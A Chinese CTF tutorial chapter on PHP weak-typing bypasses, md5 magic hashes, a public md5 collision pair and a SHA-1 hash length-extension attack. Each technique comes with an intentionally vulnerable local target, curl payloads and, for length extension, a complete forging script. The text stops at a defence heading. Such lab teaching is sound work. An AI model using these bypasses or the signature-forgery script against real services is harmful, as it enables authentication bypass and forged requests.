---
chapter: Web安全
section: 语言特性与 Tricky 绕过
order: 617
tags:
  - CTF
  - Web安全
  - 弱类型
  - md5碰撞
  - Tricky
publish: true
---

# W17 语言特性与 Tricky 绕过
## Language Quirks & Tricky Bypasses

> [!info]- 章节信息
> **所属方向**：Web 安全 ｜ **难度阶段**：L3 进阶期 ｜ **前置要求**：[[11-Web安全版图与Burp|11 章]] · [[W04-SQL注入|W04]] · [[W05-命令注入与代码执行|W05]]
> **本章目标**：把 [[11-Web安全版图与Burp#4. 语言特性即考点|11 章第 4 节]]的每一条"一瞥"展开成全集：讲透 `==` 的类型转换机理与字符串转数字规则；把 0e 魔法哈希从一对扩充成 md5/sha1 各自的集合并逐条打靶；用公开碰撞字节块把"真碰撞"与 0e 区分开；用手工续算 SHA-1 内部状态完成一次哈希长度扩展；把 Unicode 规范化与大小写折叠对文件名、黑名单的影响靶场化；把无字母数字 RCE 的取反、异或、自增链、或四类构造器全部打到靶上；最后收拢 intval、`str_replace` 链、变量覆盖等零散 Tricky，并给出对应的防御写法。

[[11-Web安全版图与Burp#4. 语言特性即考点|11 章第 4 节]]给过结论：CTF Web 的一半考点不是漏洞，是语言怪癖。那一节用最小演示让每类怪癖"出现过一次"；本章做两件事：==把机理讲透==——每条怪癖都能从语言的类型转换规则推出来，而不是靠背 payload；==把集合补全==——11 章没给的 md5 真碰撞、Unicode 规范化、无字母数字 RCE 在这里逐个补上，每条配自建靶。

这些考点与 [[W09-SSTI|W09]]、[[W12-PHP反序列化|W12]]、[[W15-Python反序列化与沙箱逃逸|W15]] 同属一个家族：==本该当数据处理的输入，因为语言自己的规则被当成了别的语义==。差别只在"当成了什么"：模板语法、对象方法、还是另一个值。

> [!note] 本章的实验约定
> PHP 行为一律按 PHP 8 记录，PHP 5/7 的历史差异在正文注明版本背景（[[11-Web安全版图与Burp#4.1 PHP 弱类型比较|11 章 4.1]] 给过 `"php"==0` 在 PHP 7 为 true、PHP 8 改规则的分界，本章多处回到这条线上）。靶场用 [[W02-工具链实战与靶场搭建|W02]] 的 `php -S` 单文件起靶，端口集中在 9700 段；curl 一律带 `--noproxy '*'` 绕过环境代理直连靶机（[[11-Web安全版图与Burp#6. 常见问题|11 章常见问题表]]讲过这个坑），查询串一律引号包住。

## 1. PHP 弱类型全集

### 1.1 == 的转换规则

`==` 不是"模糊相等"，它是一台有确定规则的转换机：==比较前先把两个操作数转换成同一类型，再比==。PHP 8 下记两条主规则就够推绝大多数结果：

1. 一方是 bool 或 null：双方都转 bool 再比。非空非零非 "0" 的值都是 true；
2. 一方是数字、另一方是字符串：==字符串是"完整数字字符串"才转成数字比较，否则把数字转成字符串、按字符串比==。第 2 条的"否则"分支是 PHP 8 的新规则——PHP 7 及以前，数字会转成数字去和任何字符串比，于是 `0 == "php"` 在 PHP 7 为 true、PHP 8 为 false。

一段脚本把两条规则下的高频结果逐个打出：

```php
<?php
// cmp1.php —— == 的类型间转换与字符串转数字（PHP 8）
echo "== 类型间 == 对照 ==\n";
$pairs = [
    ['0 == false',      0 == false],
    ['"0" == false',    "0" == false],
    ['"" == false',     "" == false],
    ['null == false',   null == false],
    ['null == 0',       null == 0],
    ['null == ""',      null == ""],
    ['0 == "php"',      0 == "php"],
    ['0 == ""',         0 == ""],
    ['0 == "0"',        0 == "0"],
    ['0 == "0e5"',      0 == "0e5"],
    ['1 == "1abc"',     1 == "1abc"],
    ['"1e2" == "100"',  "1e2" == "100"],
    ['true == "whatever"', true == "whatever"],
    ['true == ""',      true == ""],
    ['true == 0',       true == 0],
];
foreach ($pairs as [$label, $v]) {
    printf("%-20s => %s\n", $label, var_export($v, true));
}

echo "\n== 字符串转数字的解析边界 ==\n";
foreach (["42abc", "  42", "1e3", "0x1A", "1.5e2", "abc", ""] as $s) {
    printf("%-8s => (float)%s  (int)%s\n",
        json_encode($s), var_export((float)$s, true), var_export((int)$s, true));
}
```

```bash
php cmp1.php
```

输出：

```
== 类型间 == 对照 ==
0 == false           => true
"0" == false         => true
"" == false          => true
null == false        => true
null == 0            => true
null == ""           => true
0 == "php"           => false
0 == ""              => false
0 == "0"             => true
0 == "0e5"           => true
1 == "1abc"          => false
"1e2" == "100"       => true
true == "whatever"   => true
true == ""           => false
true == 0            => false

== 字符串转数字的解析边界 ==
"42abc"  => (float)42.0  (int)42
"  42"   => (float)42.0  (int)42
"1e3"    => (float)1000.0  (int)1000
"0x1A"   => (float)0.0  (int)0
"1.5e2"  => (float)150.0  (int)150
"abc"    => (float)0.0  (int)0
""       => (float)0.0  (int)0
```

逐条对照规则读：

- `0 == false`、`null == 0`、`null == ""` 全部走规则 1：null 与 bool 参与时双方转 bool，null 转 false，空串转 false，false == false 成立；
- `0 == "php"` 与 `0 == ""` 走规则 2 的"否则"分支：数字转字符串 `"0"`，与 `"php"`、`""` 按字符串比，都不等。==PHP 7 里这两条是 true，PHP 8 是 false==——判断靶子行为前先看版本；
- `1 == "1abc"` 在 PHP 8 也是 false：`"1abc"` 有前导数字但不是完整数字串，不触发数值比较。PHP 7 里它是 true（前导数字截断后比），==这条差异杀掉了一大批老 payload==；
- `true == "whatever"` 走规则 1：非空字符串转 true。==任何非空字符串和 true 弱比较都成立==，1.6 节的 JSON 绕过靠的就是它；
- `"1e2" == "100"` 是两个完整数字字符串，转成 100.0 和 100.0 数值比较，成立。

下半段是字符串转数字的解析边界：取前导空白，然后取尽可能长的前导数字（含小数点与科学计数法的 `e`），取不到就是 0。两个版本差异值得记：`"0x1A"` 转出 0——十六进制字面量从 PHP 7 起不再被字符串转换认作数字；`"1e3"` 转出 1000——科学计数法完整合法，这就是 0e 魔法哈希的全部机理基础。

> [!warning] 转换规则变了，payload 就会过期
> 本章多处会出现"PHP 7 成立、PHP 8 失效"的同族差异（`0 == "php"`、`1 == "1abc"`、`in_array("abc", [0])`、裸高字节常量）。打靶第一步是确认靶子的 PHP 版本——响应头、报错页、或 `phpinfo()` 都能看。拿着 PHP 7 时代题解的 payload 直接打 PHP 8 靶，是这一章题型最常见的死法。

### 1.2 0e 魔法哈希：md5 与 sha1 各自的集合

字符串转数字认得科学计数法，于是 ==任何 `0e` 开头、后面全是数字的字符串，转成数字都是 0.0==。两个这样的字符串弱比较，就是 `0.0 == 0.0`。md5 值恰好落进这个形态的输入串是可以搜出来的，社区把这类串叫**魔法哈希**（magic hash）。用脚本把常用的一批核对一遍：

```python
# magichash2.py —— 0e 魔法哈希表：md5 与 sha1 各自的集合，互不通用
import hashlib

MD5_POOL = ["240610708", "QNKCDZO", "s878926199a", "s155964671a", "s214587387a",
            "s1836677006a", "s1184209335a", "s1502113478a", "aabg7XSs", "0e1137126905"]
SHA1_POOL = ["aaroZmOk", "aaK1STfY", "aaO8zKZF", "aa3OFF9m"]

def is_magic(h: str) -> bool:
    return h.startswith("0e") and h[2:].isdigit()

print("== md5 ==")
md5_hits = []
for s in MD5_POOL:
    h = hashlib.md5(s.encode()).hexdigest()
    if is_magic(h):
        md5_hits.append((s, h))
        print(f"{s:<14} {h}")
    else:
        print(f"{s:<14} {h}   (不是 0e 形态)")

print("\n== sha1 ==")
sha1_hits = []
for s in SHA1_POOL:
    h = hashlib.sha1(s.encode()).hexdigest()
    if is_magic(h):
        sha1_hits.append((s, h))
        print(f"{s:<12} {h}")

print("\n== 集合互不通用 ==")
(a, _), (b, _) = md5_hits[0], md5_hits[1]
print(f"md5 一对: md5({a!r}) == md5({b!r}) 按 PHP 弱比较成立（同为 0e 开头全数字）")
print(f"同一对串的 sha1: {hashlib.sha1(a.encode()).hexdigest()} vs {hashlib.sha1(b.encode()).hexdigest()}")
```

```bash
python3 magichash2.py
```

输出：

```
== md5 ==
240610708      0e462097431906509019562988736854
QNKCDZO        0e830400451993494058024219903391
s878926199a    0e545993274517709034328855841020
s155964671a    0e342768416822451524974117254469
s214587387a    0e848240448830537924465865611904
s1836677006a   0e481036490867661113260034900752
s1184209335a   0e072485820392773389523109082030
s1502113478a   0e861580163291561247404381396064
aabg7XSs       0e087386482136013740957780965295
0e1137126905   0e291659922323405260514745084877

== sha1 ==
aaroZmOk     0e66507019969427134894567494305185566735
aaK1STfY     0e76658526655756207688271159624026011393
aaO8zKZF     0e89257456677279068558073954252716165668
aa3OFF9m     0e36977786278517984959260394024281014729

== 集合互不通用 ==
md5 一对: md5('240610708') == md5('QNKCDZO') 按 PHP 弱比较成立（同为 0e 开头全数字）
同一对串的 sha1: e15bb2cd4be5938a96025be77350f28d71a90bc7 vs b671c79cf7e1cf05da3ef2f5f2d0edfb43c17626
```

三件事从输出里读出来：md5 的 0e 集合有十个现成成员，任意两个都能配对；sha1 有自己的四个成员（它们与 md5 的不是同一批串）；==md5 的对拿到 sha1 上不成立==——哈希值由算法决定，换算法就得换集合。注意最后一个成员 `0e1137126905` 本身就是 `0e` 开头的数字串，它 md5 之后仍是 0e 形态，这类"自指"串在只能控制一个输入、需要它同时等于另一个已知 0e 值的题里会用到。

[[11-Web安全版图与Burp#4.1 PHP 弱类型比较|11 章 4.1]]给过这一族的最小靶。这里补上服务端全流程——靶子要求两个不同的输入、md5 弱比较相等：

```php
<?php
// md5.php —— md5 弱相等校验：两个不同的输入、md5 弱比较相等才给 flag
header('Content-Type: text/plain; charset=utf-8');
$a = $_GET['a'] ?? '';
$b = $_GET['b'] ?? '';
if ($a !== $b && md5($a) == md5($b)) {
    echo "flag{w34k_md5_0e}";
} else {
    echo "no\n";
}
```

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9701/md5.php?a=1&b=2'
curl -s --noproxy '*' 'http://127.0.0.1:9701/md5.php?a=240610708&b=QNKCDZO'
curl -s --noproxy '*' 'http://127.0.0.1:9701/md5.php?a=s878926199a&b=s155964671a'
```

输出：

```
no
flag{w34k_md5_0e}
flag{w34k_md5_0e}
```

`$a !== $b` 挡住了"同一个值传两次"，挡不住"两个不同值的哈希弱比较相等"。sha1 版靶子同一形态，用错集合就过不去：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9701/sha1.php?a=240610708&b=QNKCDZO'
curl -s --noproxy '*' 'http://127.0.0.1:9701/sha1.php?a=aaroZmOk&b=aaK1STfY'
```

输出：

```
no
flag{sha1_h4s_0e_t00}
```

> [!note] 0e 集合是"预计算表"，不是万能字典
> 这些串的价值在提前算好、比赛时直接查表。超出表外的场景（比如要求输入以特定前缀开头、还得是 0e 形态）需要自己跑搜索——约束"前缀固定 + md5 以 0e 开头 + 余下全是数字"的搜索成本依然远低于普通哈希爆破，第 9 节的练习里有对应的改造任务。

### 1.3 md5(数组)：从 NULL 到 TypeError 的版本分界

[[11-Web安全版图与Burp#4.1 PHP 弱类型比较|11 章 4.1]]末尾提过"传数组让 `md5()` 返回 NULL"的绕法。这条绕法有严格的版本边界，靶子上看得最清楚。靶子只做一件事：`md5($_GET['a']) == md5($_GET['b'])`：

```php
<?php
// arr.php —— md5(数组) 型：PHP 8 下的真实行为
header('Content-Type: text/plain; charset=utf-8');
$a = $_GET['a'] ?? '';
$b = $_GET['b'] ?? '';
if (md5($a) == md5($b)) {
    echo "flag{null_eq_null}";
} else {
    echo "no\n";
}
```

先打普通字符串，确认校验在工作；再把参数写成 `a[]=1&b[]=2`——查询串里方括号让 PHP 把参数收成数组：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9701/arr.php?a=1&b=2'
curl -s --noproxy '*' -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:9701/arr.php?a[]=1&b[]=2'
```

输出：

```
no
500
```

500、响应体为空。服务器日志里有原因：

```
[Fri Oct 23 23:55:31 2026] PHP Fatal error:  Uncaught TypeError: md5(): Argument #1 ($string) must be of type string, array given in …/t1/arr.php:6
```

版本分界一句话：==PHP 7 及以前，标量函数收到数组只发 Warning 并返回 NULL，两个 NULL 弱比较相等，绕过成立；PHP 8 起这类参数类型不匹配直接抛 TypeError，脚本当场终止，这条绕过死了==。`sha1()`、`strcmp()`、`strpos()` 等一整族标量函数行为相同——PHP 8 下给它们传数组都是同一种 TypeError。读老题解看到"数组绕 md5"的写法，先确认靶子是不是 PHP 7 及以前，PHP 8 靶上照抄只会收获一个 500。

### 1.4 `in_array` 与 `switch`：松散比较的另外两个入口

`in_array` 的第三个参数 `$strict` 缺省是 false，此时它用 `==` 做成员比较——白名单于是继承了 1.1 的全部糊涂账。靶子是"id 必须在白名单里"：

```php
<?php
// inarray.php —— in_array 白名单，第三参 strict 缺失
header('Content-Type: text/plain; charset=utf-8');
$ids = [10, 11];
$id = $_GET['id'] ?? '';
if (in_array($id, $ids)) {
    echo "flag{in_array_l00se} id=" . var_export($id, true) . "\n";
} else {
    echo "no, id=" . var_export($id, true) . "\n";
}
var_dump(in_array($id, $ids, true));   // 严格模式对照
```

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9701/inarray.php?id=9'
curl -s --noproxy '*' 'http://127.0.0.1:9701/inarray.php?id=1e1'
curl -s --noproxy '*' 'http://127.0.0.1:9701/inarray.php?id=10e0'
```

输出：

```
no, id='9'
bool(false)

flag{in_array_l00se} id='1e1'
bool(false)

flag{in_array_l00se} id='10e0'
bool(false)
```

`"1e1"` 与 `"10e0"` 都不是白名单里的字面值，但它们是完整数字字符串，转成 10.0 后与整数 10 弱比较相等——==白名单里混入数字类型时，`in_array` 的"白"只对弱比较成立==；第三参传 true 后两串全被拒（输出的 `bool(false)`）。1.1 的 `in_array("abc", [0])` 在 PHP 7 曾是 true、PHP 8 为 false，同属这套规则随版本的收紧。

`switch` 的 case 比较也是松散的，规则与 `==` 一致。靶子把秘密放在 `case '0'` 下面：

```php
<?php
// switch.php —— switch 松散比较：case '0' 用 0e 串命中
header('Content-Type: text/plain; charset=utf-8');
$c = $_GET['c'] ?? '';
switch ($c) {
    case '0':
        echo "flag{sw1tch_l00se}\n";
        break;
    default:
        echo "no, c=" . var_export($c, true) . "\n";
}
```

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9701/switch.php?c=abc'
curl -s --noproxy '*' 'http://127.0.0.1:9701/switch.php?c=0e462097431906509019562988736854'
curl -s --noproxy '*' 'http://127.0.0.1:9701/switch.php?c=0.0'
```

输出：

```
no, c='abc'
flag{sw1tch_l00se}
flag{sw1tch_l00se}
```

`"abc"` 在 PHP 8 走的是"数字转字符串再比"的新规则，与 `"0"` 不等（PHP 7 里它会让 `case 0` 命中）；而 0e 魔法串与 `"0.0"` 都是完整数字串，转成 0.0 后与 `'0'` 相等。==写 switch 的出题人往往以为 case 是精确匹配，实际它复制了 `==` 的全部行为==。

### 1.5 json_decode 之后的 true/1 混淆

JSON 的类型系统比 PHP 更严，但 `json_decode` 把值解出来之后就进了 PHP 的类型世界，后面的每一次 `==` 都按 1.1 的规则走。靶子读 POST 的 JSON 体，校验 `user == 'admin'` 且 `is_admin == 1`：

```php
<?php
// json.php —— JSON true 与字符串/数字的弱比较
header('Content-Type: text/plain; charset=utf-8');
$data = json_decode(file_get_contents('php://input'));
if (!isset($data->user, $data->is_admin)) {
    echo "bad json\n";
    exit;
}
if ($data->user == 'admin' && $data->is_admin == 1) {
    echo "flag{js0n_true_p4ss}\n";
} else {
    echo "no, user=" . var_export($data->user, true)
       . " is_admin=" . var_export($data->is_admin, true) . "\n";
}
```

```bash
curl -s --noproxy '*' -X POST -d '{"user": "guest", "is_admin": 0}' 'http://127.0.0.1:9701/json.php'
curl -s --noproxy '*' -X POST -d '{"user": true, "is_admin": true}' 'http://127.0.0.1:9701/json.php'
curl -s --noproxy '*' -X POST -d '{"user": "admin", "is_admin": 1}' 'http://127.0.0.1:9701/json.php'
```

输出：

```
no, user='guest' is_admin=0
flag{js0n_true_p4ss}
flag{js0n_true_p4ss}
```

第二条是 [[11-Web安全版图与Burp#4.1 PHP 弱类型比较|11 章 4.1]]那句"JSON true 和任意字符串弱比较也为 true"的靶场形态：`true == 'admin'` 走规则 1，非空字符串转 true，成立——==题面要求"用户名字符串"，攻击者交一个 JSON 布尔就顶过去了==。第三条更普通：`1 == 1` 本来就成立，它演示的是"作者以为 `is_admin` 只会是布尔，实际 JSON 里写数字也一样过"。反过来，`{"is_admin": true}` 也能通过 `== 1` 的校验——true 与数字弱比较时数字转 bool，1 是 true。两组方向都通，因为规则 1 不在乎谁 originally 是布尔。

## 2. md5 真碰撞：与 0e 的本质区别

0e 魔法哈希的本质是==弱比较加上一个形状特殊的哈希值==，两个输入的 md5 值其实并不相同（`0e46…` 与 `0e83…` 是两个不同的串）。**真碰撞**（collision）是另一回事：==两组不同的字节，md5 摘要完全相同==——换成 `===`、`hash_equals` 甚至逐字节比摘要都拦不住，因为摘要本身就是一个东西。

MD5 的碰撞攻击自 2004 年起就是公开技术，现在有现成工具（fastcoll、hashclash）秒级生成。下面这对 128 字节的碰撞块是流传最广的公开样本，两个块只有 6 个字节不同（每处都是高位的那个 bit 被翻转），md5 却完全一致。把两块写成文件并核对：

```python
# coll.py —— 写入公开的 md5 碰撞字节块，对比 md5 相同、字节不同
import hashlib

block_a = bytes.fromhex(
    "d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f89"
    "55ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5b"
    "d8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0"
    "e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70"
)
block_b = bytes.fromhex(
    "d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f89"
    "55ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5b"
    "d8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0"
    "e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70"
)

print("len(a) =", len(block_a), " len(b) =", len(block_b))
print("md5(a) =", hashlib.md5(block_a).hexdigest())
print("md5(b) =", hashlib.md5(block_b).hexdigest())
print("md5 相同 =", hashlib.md5(block_a).hexdigest() == hashlib.md5(block_b).hexdigest())
print("内容不同 =", block_a != block_b)
diff = [i for i in range(128) if block_a[i] != block_b[i]]
print("不同字节位置 =", diff)
print("不同字节对 =", [(hex(block_a[i]), hex(block_b[i])) for i in diff])

with open("coll_a.bin", "wb") as f:
    f.write(block_a)
with open("coll_b.bin", "wb") as f:
    f.write(block_b)
print("已写入 coll_a.bin / coll_b.bin")
```

```bash
python3 coll.py
md5sum coll_a.bin coll_b.bin
```

输出：

```
len(a) = 128  len(b) = 128
md5(a) = 79054025255fb1a26e4bc422aef54eb4
md5(b) = 79054025255fb1a26e4bc422aef54eb4
md5 相同 = True
内容不同 = True
不同字节位置 = [19, 45, 59, 83, 109, 123]
不同字节对 = [('0x87', '0x7'), ('0x71', '0xf1'), ('0xf2', '0x72'), ('0xb4', '0x34'), ('0xa8', '0x28'), ('0x2b', '0xab')]
已写入 coll_a.bin / coll_b.bin
79054025255fb1a26e4bc422aef54eb4  coll_a.bin
79054025255fb1a26e4bc422aef54eb4  coll_b.bin
```

靶子要求上传两个文件：内容不同、md5 严格相等才给 flag：

```php
<?php
// collide.php —— md5 真碰撞靶：上传两个文件，内容不同但 md5 相同才给 flag
header('Content-Type: text/plain; charset=utf-8');
$f1 = $_FILES['f1']['tmp_name'] ?? '';
$f2 = $_FILES['f2']['tmp_name'] ?? '';
if ($f1 === '' || $f2 === '') {
    echo "upload two files: f1, f2\n";
    exit;
}
$c1 = file_get_contents($f1);
$c2 = file_get_contents($f2);
printf("f1: %d bytes, md5 %s\n", strlen($c1), md5($c1));
printf("f2: %d bytes, md5 %s\n", strlen($c2), md5($c2));
if ($c1 !== $c2 && md5($c1) === md5($c2)) {
    echo "flag{r34l_c0ll1s10n}";
} else {
    echo "no: need two DIFFERENT files with EQUAL md5 (strict ===)\n";
}
```

三组上传对照——普通文件、同一文件传两次、碰撞对（打靶目录里先造两个内容不同的普通文件）：

```bash
echo aaa > n1.txt
echo bbb > n2.txt
curl -s --noproxy '*' -F f1=@n1.txt -F f2=@n2.txt http://127.0.0.1:9702/collide.php
```

输出：

```
f1: 4 bytes, md5 5c9597f3c8245907ea71a89d9d39d08e
f2: 4 bytes, md5 b8694d827c0f13f22ed3bc610c19ec15
no: need two DIFFERENT files with EQUAL md5 (strict ===)
```

```bash
curl -s --noproxy '*' -F f1=@coll_a.bin -F f2=@coll_a.bin http://127.0.0.1:9702/collide.php
```

输出：

```
f1: 128 bytes, md5 79054025255fb1a26e4bc422aef54eb4
f2: 128 bytes, md5 79054025255fb1a26e4bc422aef54eb4
no: need two DIFFERENT files with EQUAL md5 (strict ===)
```

```bash
curl -s --noproxy '*' -F f1=@coll_a.bin -F f2=@coll_b.bin http://127.0.0.1:9702/collide.php
```

输出：

```
f1: 128 bytes, md5 79054025255fb1a26e4bc422aef54eb4
f2: 128 bytes, md5 79054025255fb1a26e4bc422aef54eb4
flag{r34l_c0ll1s10n}
```

第二组特意展示了 `$c1 !== $c2` 这道内容闸：同一个文件传两次，md5 相等但内容也相等，被拒；第三组两块字节不同（6 处）、md5 相同，`===` 级别的校验也拦不住。上传的报文形态与 [[W07-文件上传|W07]] 的 multipart 一致。

> [!info]- 选择前缀碰撞：碰撞攻击的加强版
> 上面的样本是"固定对"——两块字节是特定的。加强版叫**选择前缀碰撞**（chosen-prefix collision）：给任意两个不同前缀，都能续算出使总 md5 相同的后缀，工具是 Marc Stevens 的 hashclash/fastcoll。它的著名战绩都在真实世界：2008 年 Chaos Communication Congress 上研究者用它在 RapidSSL 真实签发流程下造出了伪造的 CA 证书；2012 年的 Flame 木马用它伪造了微软的代码签名证书。CTF 里拿到"上传两个前缀被指定的文件、md5 相同过校验"的题，就是选这工具。获取途径：hashclash 项目页与 fastcoll 源码（GitHub 检索 fastcoll），Linux 下编译即用。

> [!warning] 碰撞只对 md5 成立，传输环节别改字节
> 两条红线。其一，==碰撞对只对生成它的算法成立==：上面两块的 sha1 值并不相同（第 2 节输出可见 0e 的同类结论，真碰撞同理），靶子把校验换成 sha1 就得另找 sha1 的碰撞（SHA-1 已有公开的 SHA-1 shattered 碰撞对，同样可搜到字节）。其二，碰撞文件是按字节精确的 128 字节，==任何环节加了换行、转了行尾（FTP ASCII 模式、Windows 编辑器）、或被 base64 解码失败吞掉，md5 就变了==——打不中时先 `od -c 文件 | tail` 对照首尾字节，再 `md5sum` 对表内的 `7905…`。

## 3. 哈希长度扩展：sha1(secret||data) 的伪造签名

md5、sha1、sha256 都属于 **Merkle–Damgård 结构**：把消息切成 64 字节分组，逐组送进压缩函数，上一组的输出（内部状态）是下一组的输入，==最终的哈希值就是"处理完最后一块之后的内部状态"==。这个结构有一个直接推论：知道 `sha1(secret || data)` 的值，又知道 `secret` 的长度，就能把这份哈希**还原成内部状态**，然后==不掌握 secret、直接续算 `sha1(secret || data || glue || append)`==——其中 glue 是为凑满分组补的填充字节。签名服务若把签名定义成 `hash(secret || data)`，攻击者就能在 data 后面追加任意内容并造出新签名。

靶子是一个签名 API：`/sign` 返回 `sha1(secret||data)`，`/check` 校验签名后按 `a=b&c=d` 解析 data，出现 `admin=true` 给 flag。题面告知 secret 长度为 7：

```python
# t3/server.py —— 长度扩展签名靶：sha1(SECRET || data) 做请求签名
import hashlib
import hmac
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer

SECRET = b"s3cr3t!"          # 7 字节；题面告知 "secret 长度为 7"
FLAG = "flag{l3ngth_3xt}"

def sign(data: bytes) -> str:
    return hashlib.sha1(SECRET + data).hexdigest()

def param(query: bytes, name: bytes) -> bytes:
    """从原始查询串按字节取出参数（percent 解码为原始字节，二进制安全）。"""
    for pair in query.split(b"&"):
        if pair.startswith(name + b"="):
            return urllib.parse.unquote_to_bytes(pair[len(name) + 1:])
    return b""

class H(BaseHTTPRequestHandler):
    def _send(self, text: str):
        body = text.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        u = urllib.parse.urlparse(self.path)
        q = u.query.encode()
        if u.path == "/check":
            data = param(q, b"data")
            sig = param(q, b"sig").decode(errors="replace")
            if not hmac.compare_digest(sign(data), sig):
                self._send("bad signature")
                return
            for p in data.split(b"&"):
                if p.split(b"=", 1) == [b"admin", b"true"]:
                    self._send(FLAG)
                    return
            self._send("signature ok, but no admin=true in data")
            return
        if u.path == "/sign":
            self._send("sig=" + sign(param(q, b"data")))
            return
        self._send("API: /sign?data=<...> /check?data=<...>&sig=<hex>\n")

    def log_message(self, *a):
        pass

HTTPServer(("127.0.0.1", 9703), H).serve_forever()
```

攻击脚本的核心件是一份手写 SHA-1：压缩函数接收**任意初始状态**，续算函数从已知摘要恢复状态后接着吸收新数据。正确性先对 hashlib 自检：

```python
# sha1ext.py —— 手工实现 SHA-1 内部状态续算（长度扩展攻击的核心件）
import struct

def _rotl(n: int, b: int) -> int:
    return ((n << b) | (n >> (32 - b))) & 0xFFFFFFFF

def sha1_compress(state, block: bytes):
    """对单个 64 字节分组做一轮压缩，返回新的 (h0..h4)。"""
    h0, h1, h2, h3, h4 = state
    w = list(struct.unpack(">16I", block))
    for i in range(16, 80):
        w.append(_rotl(w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16], 1))
    a, b, c, d, e = state
    for i in range(80):
        if i < 20:
            f = (b & c) | (~b & d); k = 0x5A827999
        elif i < 40:
            f = b ^ c ^ d;           k = 0x6ED9EBA1
        elif i < 60:
            f = (b & c) | (b & d) | (c & d); k = 0x8F1BBCDC
        else:
            f = b ^ c ^ d;           k = 0xCA62C1D6
        temp = (_rotl(a, 5) + f + e + k + w[i]) & 0xFFFFFFFF
        e, d, c, b, a = d, c, _rotl(b, 30), a, temp
    return ((h0 + a) & 0xFFFFFFFF, (h1 + b) & 0xFFFFFFFF, (h2 + c) & 0xFFFFFFFF,
            (h3 + d) & 0xFFFFFFFF, (h4 + e) & 0xFFFFFFFF)

def sha1_pad(msg_len: int) -> bytes:
    """为总长 msg_len 字节的消息产出 MD 结构填充（0x80、补零、64 位大端比特长度）。"""
    out = b"\x80"
    out += b"\x00" * ((56 - (msg_len + 1) % 64) % 64)
    out += struct.pack(">Q", msg_len * 8)
    return out

INIT = (0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0)

def sha1_from_state(state, tail: bytes, prefix_len: int) -> str:
    """已知前缀长 prefix_len 字节时的内部状态 state，续算 tail，返回十六进制摘要。"""
    buf = tail + sha1_pad(prefix_len + len(tail))
    for i in range(0, len(buf), 64):
        state = sha1_compress(state, buf[i:i + 64])
    return "".join(f"{x:08x}" for x in state)

def sha1_hex(msg: bytes) -> str:
    return sha1_from_state(INIT, msg, 0)

if __name__ == "__main__":
    import hashlib
    for m in [b"", b"abc", b"user=guest", b"x" * 55, b"y" * 56, b"z" * 119, b"w" * 120]:
        assert sha1_hex(m) == hashlib.sha1(m).hexdigest(), m
    print("自检: sha1_from_state 与 hashlib 全部一致")
```

```bash
python3 sha1ext.py
```

输出：

```
自检: sha1_from_state 与 hashlib 全部一致
```

攻击流程四步：正常拿一个签名；用"secret 长度 + 原数据长度"算出 glue 填充；把已知摘要的 20 字节按大端还原成 5 个 32 位状态字，从**块对齐长度**处续算追加内容；把"原数据 + glue + 追加内容"与伪造签名一起发回去：

```python
# extattack.py —— 长度扩展攻击：不掌握 secret，追加 admin=true 并伪造新签名
import requests
from sha1ext import sha1_from_state, sha1_pad

BASE = "http://127.0.0.1:9703"
secret_len = 7                     # 题面告知
orig = b"user=guest"
append = b"&admin=true"

# 1) 正常拿一个签名
r = requests.get(BASE + "/sign", params={"data": orig.decode()})
mac = r.text.split("=", 1)[1]
print("原始签名 :", r.text)

# 2) 构造填充与伪造数据
glue = sha1_pad(secret_len + len(orig))
forged = orig + glue + append
print("glue 长度:", len(glue), " 伪造 data 总长:", len(forged))

# 3) 从已知 mac 恢复内部状态，续算 append
#    续算起点是"块对齐"长度：secret+orig 连同 glue 恰好凑满整数个 64 字节分组
aligned = secret_len + len(orig) + len(glue)
assert aligned % 64 == 0, aligned
state = tuple(int.from_bytes(bytes.fromhex(mac)[i:i + 4], "big") for i in range(0, 20, 4))
new_mac = sha1_from_state(state, append, aligned)
print("对齐长度 :", aligned, "（续算从这个字节偏移开始）")
print("伪造签名 :", new_mac)

# 4) 用伪造的 data+签名请求 /check
r = requests.get(BASE + "/check", params={"sig": new_mac, "data": forged})
print("check    :", r.text)
```

基线先确认服务端行为正常、错签名被拒：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9703/sign?data=user%3Dguest'
curl -s --noproxy '*' 'http://127.0.0.1:9703/check?data=user%3Dguest&sig=0000000000000000000000000000000000000000'
```

输出：

```
sig=75656ca49c3c3420cf408ee62c1d2fd81b632283
bad signature
```

```bash
python3 extattack.py
```

输出：

```
原始签名 : sig=75656ca49c3c3420cf408ee62c1d2fd81b632283
glue 长度: 47  伪造 data 总长: 68
对齐长度 : 64 （续算从这个字节偏移开始）
伪造签名 : 9c288827605b9552df579e5e15b1f8dfbab93e16
check    : flag{l3ngth_3xt}
```

整条攻击没碰过 `SECRET` 的内容。机制上三点值得停一下：glue 长度 47 恰好把 17 字节的 `secret||data` 垫到 64——==glue 就是 sha1 自己会补的那段填充，攻击者替它补上==；续算起点必须是块对齐长度（64 而不是 17），因为状态字描述的是"处理完整数个分组之后"的机器；服务端拿到的 data 字节里有一段二进制填充，解析 `a=b&c=d` 时它只是第一个"参数名"里的乱码，不影响最后一个参数被读出 `admin=true`。

> [!warning] 适用条件与防御
